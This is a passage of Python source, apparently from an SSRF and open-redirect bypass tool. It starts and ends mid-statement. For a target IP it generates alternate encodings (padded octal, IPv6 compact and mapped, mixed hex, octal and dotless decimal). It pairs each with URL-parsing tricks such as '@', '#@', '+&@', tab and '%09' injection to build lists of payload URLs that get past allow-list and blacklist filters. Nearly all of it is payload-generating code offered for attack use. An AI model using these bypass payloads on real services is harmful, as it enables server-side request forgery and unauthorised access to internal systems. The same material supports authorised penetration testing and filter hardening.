ALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP5,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP5,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP5,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP5,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP5,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 6 - Dotted octal with padding\nprint(bluecolor,\"Dotted octal with padding IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP6 = '0' + OCT_SINGLE(ipFrag3) + \".\" + '00' + OCT_SINGLE(ipFrag2) + \".\" + '000' + OCT_SINGLE(ipFrag1) + \".\" + '0000' + OCT_SINGLE(ipFrag0)\nprint('http://',IP6,':',PORT,'/',sep='')\nprint('http://',IP6,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP6,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP6,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',sep='')\nprint('http://',IP6,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP6,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP6,':',PORT,'/',sep='')\nprint('http://',IP6,':',PORT,':80','/',sep='')\nprint('http://',IP6,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP6,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP6,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP6,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP6,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP6,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP6,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP6,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 7 - IPv6 compact version\nprint(bluecolor,\"IPv6 compact version IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP7 = '[::' + ipFrag3 + \".\" + ipFrag2 + \".\" + ipFrag1 + \".\" + ipFrag0 + ']'\nprint('http://',IP7,':',PORT,'/',sep='')\nprint('http://',IP7,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP7,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP7,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',sep='')\nprint('http://',IP7,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP7,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP7,':',PORT,'/',sep='')\nprint('http://',IP7,':',PORT,':80','/',sep='')\nprint('http://',IP7,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP7,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP7,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP7,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP7,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP7,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP7,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP7,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 8 - IPv6 mapped version\nprint(bluecolor,\"IPv6 mapped version IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP8 = '[::ffff:' + ipFrag3 + \".\" + ipFrag2 + \".\" + ipFrag1 + \".\" + ipFrag0 + ']'\nprint('http://',IP8,':',PORT,'/',sep='')\nprint('http://',IP8,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP8,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP8,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',sep='')\nprint('http://',IP8,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP8,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP8,':',PORT,'/',sep='')\nprint('http://',IP8,':',PORT,':80','/',sep='')\nprint('http://',IP8,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP8,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP8,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP8,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP8,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP8,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP8,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP8,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 9 - Dotted hexadecimal + Dotted octal + Dotless decimal\nprint(bluecolor,\"Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP9 = HEX_SINGLE(ipFrag3,\"yes\") + \".\" + OCT_SINGLE(ipFrag2) + \".\" + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))\nprint('http://',IP9,':',PORT,'/',sep='')\nprint('http://',IP9,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP9,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP9,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',sep='')\nprint('http://',IP9,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP9,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP9,':',PORT,'/',sep='')\nprint('http://',IP9,':',PORT,':80','/',sep='')\nprint('http://',IP9,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP9,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP9,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP9,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP9,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP9,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP9,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP9,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 10 - Dotted hexadecimal + Dotless decimal\nprint(bluecolor,\"Dotted hexadecimal + Dotless decimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP10 = HEX_SINGLE(ipFrag3,\"yes\") + \".\" + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))\nprint('http://',IP10,':',PORT,'/',sep='')\nprint('http://',IP10,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP10,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP10,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',sep='')\nprint('http://',IP10,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP10,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP10,':',PORT,'/',sep='')\nprint('http://',IP10,':',PORT,':80','/',sep='')\nprint('http://',IP10,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP10,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP10,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 'export':\n\tprint('http://',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',IP10,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',IP10,':','+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP10,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP10,':',PORT,'/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,':80','/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\tprint('http://',IP10,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',file=f,sep='')\n\n#Case 11 - Dotted octal with padding + Dotless decimal\nprint(bluecolor,\"Dotted octal with padding + Dotless decimal IP Address of:\",resetcolor,yellowcolor,\" http://\",arg1,resetcolor,bluecolor,\" + authentication prefix/bypass combo list\",resetcolor,sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nIP11 = '0' + OCT_SINGLE(ipFrag3) + \".\" + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))\nprint('http://',IP11,':',PORT,'/',sep='')\nprint('http://',IP11,':',PORT,'?@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP11,':',PORT,'#@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP11,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',IP11,':',PORT,'+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',IP11,':','+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDPREFIXTEXT,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',sep='')\nprint('http://',RANDPREFIXTEXTSPEC,'@',RANDOMPREFIXVALIDSITE,'@',IP11,':',PORT,'/',sep='')\nprint('http://',IP11,':',PORT,'+&@',RANDOMPREFIXVALIDSITE,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',IP11,':',PORT,'#+@',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',RANDOMPREFIXVALIDSITE,'+&@',RANDOMPREFIXVALIDSITE,'#+@',IP11,':',PORT,'/',sep='')\nprint('http://',IP11,':',PORT,':80','/',sep='')\nprint('http://',IP11,':',PORT,'\\\\t',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP11,':',PORT,'%09',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint('http://',IP11,':',PORT,'%2509',RANDOMPREFIXVALIDSITE,'/',sep='')\nprint(greencolor,'=========================================================================================================================================',resetcolor,sep='')\nprint(\"\\n\",sep='')\nif EXPORTRESULTS == 